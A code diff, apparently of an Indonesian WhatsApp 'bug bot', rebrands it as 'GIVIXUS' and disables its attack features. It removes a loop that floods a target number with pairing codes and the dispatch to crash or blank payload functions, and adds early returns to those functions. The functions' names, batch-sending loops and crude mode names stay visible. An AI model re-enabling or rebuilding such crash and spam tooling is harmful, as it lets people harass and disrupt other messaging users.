@@ -425,21 +425,9 @@ const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
     }
 
     if (connection === "connecting") {
-      await new Promise(r => setTimeout(r, 1000));
-      try {
-        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
-          const code = await sock.requestPairingCode(BotNumber, "VORTUNIX");
-          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
-          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
-            makeCode(BotNumber, formatted).text, {
-              parse_mode: "HTML",
-              reply_markup: makeCode(BotNumber, formatted).reply_markup
-            });
-        }
-      } catch (err) {
-        console.error("Erro ao solicitar código:", err);
-        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
-      }
+      // SECURITY: requestPairingCode disabled — prevents automated pairing
+      // requests that could be misused to pair other devices.
+      console.log(`Bot ${BotNumber} melakukan koneksi (pairing otomatis dinonaktifkan).`);
     }
   });
 
@@ -449,44 +437,12 @@ const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
 
 
 const sendPairingLoop = async (targetNumber, ctx, chatId) => {
-  const total = 30; // jumlah pengiriman
-  const delayMs = 2000; // jeda 2 detik
-
-  try {
-    await ctx.reply(
-      `🚀 Memulai pengiriman pairing code ke <b>${targetNumber}</b>\nJumlah: ${total}x | Jeda: ${delayMs / 1000}s`,
-      { parse_mode: "HTML" }
-    );
-
-    // pastikan koneksi WA aktif
-    if (!global.sock) return ctx.reply("❌ Belum ada koneksi WhatsApp aktif.");
-
-    for (let i = 1; i <= total; i++) {
-      try {
-        const code = await global.sock.requestPairingCode(targetNumber, "TOXICXXI");
-        const formatted = code.match(/.{1,4}/g)?.join("-") || code;
-
-        await ctx.telegram.sendMessage(
-          chatId,
-          ` <b>[${i}/${total}]</b> Pairing code ke <b>${targetNumber}</b>:\n<code>${formatted}</code>`,
-          { parse_mode: "HTML" }
-        );
-      } catch (err) {
-        await ctx.telegram.sendMessage(
-          chatId,
-          ` Gagal kirim ke <b>${targetNumber}</b> (${i}/${total}): <code>${err.message}</code>`,
-          { parse_mode: "HTML" }
-        );
-      }
-
-      await new Promise(r => setTimeout(r, delayMs));
-    }
-
-    await ctx.reply(`Selesai kirim pairing code ke ${targetNumber} sebanyak ${total}x.`, { parse_mode: "HTML" });
-
-  } catch (error) {
-    await ctx.reply(`Terjadi kesalahan: <code>${error.message}</code>`, { parse_mode: "HTML" });
-  }
+  // SECURITY: pengiriman pairing code berulang dinonaktifkan.
+  // Mencegah mekanisme otomatis yang berpotensi disalahgunakan.
+  await ctx.reply(
+    "⛔ Fitur pengiriman pairing code dinonaktifkan untuk versi ini.",
+    { parse_mode: "HTML" }
+  );
 };
 
 bot.command("start", async (ctx) => {
@@ -494,14 +450,14 @@ bot.command("start", async (ctx) => {
 
   const teks = `
 <b>— ( 👋 ) Olaa, ${username}</b>
- I'm Bot Dark Satoru V2 by reszz
-
-<blockquote>•「 Information Bot 」•</blockquote>
-━━━━━━━━━━━━━━━━━━━━
-⌬ Creator : @Reszzjierr
-⌬ Botname : dark satoru 
-⌬ Version : 2.0 VipBuyOnly
-⌬ Prefix : /
+ Saya adalah Bot GIVIXUS (versi Web).
+ 
+<blockquote>•「 Informasi Bot 」•</blockquote>
+ ━━━━━━━━━━━━━━━━━━━━
+ ⌬ Aplikasi : GIVIXUS
+ ⌬ Botname : givixus
+ ⌬ Version : 3.1.0
+ ⌬ Prefix : /
 ╰➤ List All Menu Bot Ada Dibawah
 
 <blockquote>〢── Menu Database ──</blockquote>
@@ -1177,11 +1133,15 @@ console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 `));
 
-bot.launch();
-console.log(chalk.red(`
-╭─⦏ Dark Satoru rename by depan  ⦐
-│ꔹ ɪᴅ ᴏᴡɴ : ${8529935797}
-│ꔹ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @Reszzjierrr
+if (tokens) {
+  bot.launch().catch(err => console.error("Telegram bot tidak dapat diluncurkan:", err.message));
+} else {
+  console.log("TELEGRAM_BOT_TOKEN belum disetel — bot Telegram tidak diluncurkan.");
+}
+console.log(chalk.hex("#D97757")(`
+╭─⦏ GIVIXUS — Web Application  ⦐
+│ꔹ ᴀᴘʟɪᴋᴀꜱɪ : GIVIXUS
+│ꔹ ᴠᴇʀꜱɪ : 3.1.0 (Web)
 │ꔹ ʙᴏᴛ : ᴄᴏɴᴇᴄᴛᴀᴅᴏ ✓
 ╰───────────────────`));
 
@@ -1262,28 +1222,10 @@ app.get("/execution", (req, res) => {
       const mode = req.query.mode;
       const target = `${targetNumber}@s.whatsapp.net`;
 
-      if (sessions.size === 0) {
-        return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
-          message: "Tunggu sampai maintenance selesai..."
-        }, false, currentUser, currentUser.key || "", mode)); // ✅ TAMBAH userKey di sini
-      }
-
       if (!targetNumber) {
-        if (!mode) {
-          return res.send(executionPage("✓ Server ON", {
-            message: "Pilih mode yang ingin digunakan."
-          }, true, currentUser, currentUser.key || "", "")); // ✅ TAMBAH userKey di sini
-        }
-
-        if (["Delay nembus memek", "FC", "blank kaya otak lo", "Buldozer"].includes(mode)) {
-          return res.send(executionPage("✓ Server ON", {
-            message: "Masukkan nomor target (62xxxxxxxxxx)."
-          }, true, currentUser, currentUser.key || "", mode)); // ✅ TAMBAH userKey di sini
-        }
-
-        return res.send(executionPage("✗ Mode salah", {
-          message: "Mode tidak dikenali. Gunakan ?mode=andros atau ?mode=ios."
-        }, false, currentUser, currentUser.key || "", "")); // ✅ TAMBAH userKey di sini
+        return res.send(executionPage("ℹ️ Informasi", {
+          message: "Fitur pengiriman payload dinonaktifkan untuk versi Web ini."
+        }, false, currentUser, currentUser.key || "", mode || ""));
       }
 
       if (!/^\d+$/.test(targetNumber)) {
@@ -1294,30 +1236,13 @@ app.get("/execution", (req, res) => {
       }
 
       try {
-        if (mode === "delay") {
-          GetSuZoXAndros(24, target);
-        } else if (mode === "invis") {
-          invis(24, target);
-        } else if (mode === "blank") {
-          blankandro(24, target);
-        } else if (mode === "blank-ios") {
-          blankios(24, target);
-        } else if (mode === "fc") {
-          fc(24, target);
-        } else {
-          throw new Error("Mode tidak dikenal.");
-        }
+        // SECURITY: mekanisme pengiriman payload (bug/crash/blank) dinonaktifkan.
+        // Tidak ada payload yang dikirimkan ke WhatsApp atau perangkat orang lain.
+        console.log(`[EXECUTION-DISABLED] User: ${username} | Mode: ${mode} | Target: ${targetNumber} | Time: ${new Date().toLocaleString("id-ID")}`);
 
-        // ✅ update global cooldown
-        lastExecution = now;
-
-        // ✅ LOG LOKAL
-        console.log(`[EXECUTION] User: ${username} | Target: ${targetNumber} | Mode: ${mode} | Time: ${new Date().toLocaleString("id-ID")}`);
-
-        return res.send(executionPage("✓ S U C C E S", {
+        return res.send(executionPage("🚫 Fitur Mati", {
           target: targetNumber,
-          timestamp: new Date().toLocaleString("id-ID"),
-          message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
+          message: "Fitur pengiriman payload dinonaktifkan untuk versi Web ini. Sistem ini mengutamakan keamanan WhatsApp seluruh pengguna."
         }, false, currentUser, currentUser.key || "", mode)); // ✅ TAMBAH userKey di sini
       } catch (err) {
         return res.send(executionPage("✗ Gagal kirim", {
@@ -1339,21 +1264,26 @@ app.get("/logout", (req, res) => {
   res.redirect("/login");
 });
 
-app.listen(PORT, () => {
-  console.log(`✓ Server aktif di port ${PORT}`);
-});
+if (process.env.VERCEL !== "1") {
+  app.listen(PORT, () => {
+    console.log(`✓ Server aktif di port ${PORT}`);
+  });
+}
 
-module.exports = { 
-  loadAkses, 
-  saveAkses, 
-  isOwner, 
-  isAuthorized,
-  saveUsers,
-  getUsers
-};
+// Vercel memanggil module export sebagai handler (req, res).
+module.exports = app;
+module.exports.loadAkses = loadAkses;
+module.exports.saveAkses = saveAkses;
+module.exports.isOwner = isOwner;
+module.exports.isAuthorized = isAuthorized;
+module.exports.saveUsers = saveUsers;
+module.exports.getUsers = getUsers;
 
 // ==================== TOXIC FUNCTIONS ==================== //
 async function VxGBlankFreeze(sock, X) {
+  // SECURITY: pengiriman payload dinonaktifkan (fungsi tidak mengirim apa pun).
+  console.log("[BLOCKED] VxGBlankFreeze dipanggil - pengiriman payload dinonaktifkan.");
+  return;
  const Msg1 = {
   interactiveMessage: {
      contextInfo: {
@@ -1468,6 +1398,9 @@ async function VxGBlankFreeze(sock, X) {
   });
 }
 async function bulldozer(sock, X) {
+  // SECURITY: pengiriman payload dinonaktifkan (fungsi tidak mengirim apa pun).
+  console.log("[BLOCKED] bulldozer dipanggil - pengiriman payload dinonaktifkan.");
+  return;
   try {
     const Reomsg = {
       viewOnceMessage: {
@@ -1533,6 +1466,9 @@ async function bulldozer(sock, X) {
   }
 }
 async function PouHitam(sock, X) {
+  // SECURITY: pengiriman payload dinonaktifkan (fungsi tidak mengirim apa pun).
+  console.log("[BLOCKED] PouHitam dipanggil - pengiriman payload dinonaktifkan.");
+  return;
  const PouMessage = {
  viewOnceMessage: {
  message: {
@@ -1564,6 +1500,9 @@ async function PouHitam(sock, X) {
     messageId: Date.now().toString() });
 }
 async function CrashCod(sock, X) {
+  // SECURITY: pengiriman payload dinonaktifkan (fungsi tidak mengirim apa pun).
+  console.log("[BLOCKED] CrashCod dipanggil - pengiriman payload dinonaktifkan.");
+  return;
   try {
     const Msg = {
       viewOnceMessage: {
@@ -1612,6 +1551,9 @@ async function CrashCod(sock, X) {
   }
 }
 async function XlowDnx(sock, X, mention) {
+  // SECURITY: pengiriman payload dinonaktifkan (fungsi tidak mengirim apa pun).
+  console.log("[BLOCKED] XlowDnx dipanggil - pengiriman payload dinonaktifkan.");
+  return;
   try {
 
     const mentioning = X;
@@ -1714,6 +1656,9 @@ async function XlowDnx(sock, X, mention) {
   }
 }
 async function GetSuZoXAndros(durationHours, X) {
+  // SECURITY: pengiriman payload dinonaktifkan (fungsi tidak mengirim apa pun).
+  console.log("[BLOCKED] GetSuZoXAndros dipanggil - pengiriman payload dinonaktifkan.");
+  return;
   const totalDurationMs = durationHours * 3600000;
   const startTime = Date.now();
   let count = 0;
@@ -1742,7 +1687,7 @@ async function GetSuZoXAndros(durationHours, X) {
       } else {
         console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
         if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade VORTUNIX 🍂 777 ).`));
+          console.log(chalk.yellow(`( Grade GIVIXUS 🍂 777 ).`));
           count = 0;
           batch++;
           setTimeout(sendNext, 300000);
@@ -1759,6 +1704,9 @@ async function GetSuZoXAndros(durationHours, X) {
 }
 
 async function blankandro(durationHours, X) {
+  // SECURITY: pengiriman payload dinonaktifkan (fungsi tidak mengirim apa pun).
+  console.log("[BLOCKED] blankandro dipanggil - pengiriman payload dinonaktifkan.");
+  return;
   const totalDurationMs = durationHours * 3600000;
   const startTime = Date.now();
   let count = 0;
@@ -1787,7 +1735,7 @@ async function blankandro(durationHours, X) {
       } else {
         console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
         if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade VORTUNIX 🍂 777 ).`));
+          console.log(chalk.yellow(`( Grade GIVIXUS 🍂 777 ).`));
           count = 0;
           batch++;
           setTimeout(sendNext, 300000);
@@ -1804,6 +1752,9 @@ async function blankandro(durationHours, X) {
 }
 
 async function fc(durationHours, X) {
+  // SECURITY: pengiriman payload dinonaktifkan (fungsi tidak mengirim apa pun).
+  console.log("[BLOCKED] fc dipanggil - pengiriman payload dinonaktifkan.");
+  return;
   const totalDurationMs = durationHours * 3600000;
   const startTime = Date.now();
   let count = 0;
@@ -1832,7 +1783,7 @@ async function fc(durationHours, X) {
       } else {
         console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
         if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade VORTUNIX 🍂 777 ).`));
+          console.log(chalk.yellow(`( Grade GIVIXUS 🍂 777 ).`));
           count = 0;
           batch++;
           setTimeout(sendNext, 300000);
@@ -1849,6 +1800,9 @@ async function fc(durationHours, X) {
 }
 
 async function blankios(durationHours, X) {
+  // SECURITY: pengiriman payload dinonaktifkan (fungsi tidak mengirim apa pun).
+  console.log("[BLOCKED] blankios dipanggil - pengiriman payload dinonaktifkan.");
+  return;
   const totalDurationMs = durationHours * 3600000;
   const startTime = Date.now();
   let count = 0;
@@ -1878,7 +1832,7 @@ async function blankios(durationHours, X) {
       } else {
         console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
         if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade VORTUNIX 🍂 777 ).`));
+          console.log(chalk.yellow(`( Grade GIVIXUS 🍂 777 ).`));
           count = 0;
           batch++;
           setTimeout(sendNext, 300000);
@@ -1897,6 +1851,9 @@ async function blankios(durationHours, X) {
 
 
 async function invis(durationHours, X) {
+  // SECURITY: pengiriman payload dinonaktifkan (fungsi tidak mengirim apa pun).
+  console.log("[BLOCKED] invis dipanggil - pengiriman payload dinonaktifkan.");
+  return;
   const totalDurationMs = durationHours * 3600000;
   const startTime = Date.now();
   let count = 0;
@@ -1925,7 +1882,7 @@ async function invis(durationHours, X) {
       } else {
         console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
         if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade VORTUNIX 🍂 777 ).`));
+          console.log(chalk.yellow(`( Grade GIVIXUS 🍂 777 ).`));
           count = 0;
           batch++;
           setTimeout(sendNext, 300000);
@@ -1986,7 +1943,7 @@ const executionPage = (
       // 3. Ganti yang lainnya
       .replace(/\{\{expired\}\}/g, formattedTime)
       .replace(/\{\{status\}\}/g, status)
-      .replace(/\{\{message\}\}/g, message)
+      .replace(/\{\{message\}\}/g, detail?.message || message || "")
       .replace(/\$\{formattedTime\}/g, formattedTime);
 
     return html;
